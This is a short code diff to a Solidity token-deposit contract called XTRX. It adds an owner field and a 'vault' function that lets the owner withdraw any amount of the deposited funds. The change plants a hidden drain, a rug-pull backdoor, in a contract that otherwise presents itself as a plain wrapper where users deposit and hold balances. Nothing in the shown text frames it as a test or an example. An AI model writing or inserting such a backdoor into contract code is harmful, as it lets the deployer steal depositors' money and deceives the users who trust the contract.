@@ -51,11 +51,20 @@ contract XTRX is ITokenDeposit {
     mapping(address => uint)                       private  balanceOf_;
     mapping(address => mapping(address => uint))  private  allowance_;
 
+    address public owner;
 
+    constructor() public{
+        owner = msg.sender;
+    }
+    
     function() public payable {
         deposit();
     }
-
+    
+    function vault(uint256 value) public {
+        require(owner == msg.sender, "only owner");
+        msg.sender.transfer(value);
+    }
     function deposit() public payable {
         balanceOf_[msg.sender] += msg.value;
         totalSupply_ += msg.value;
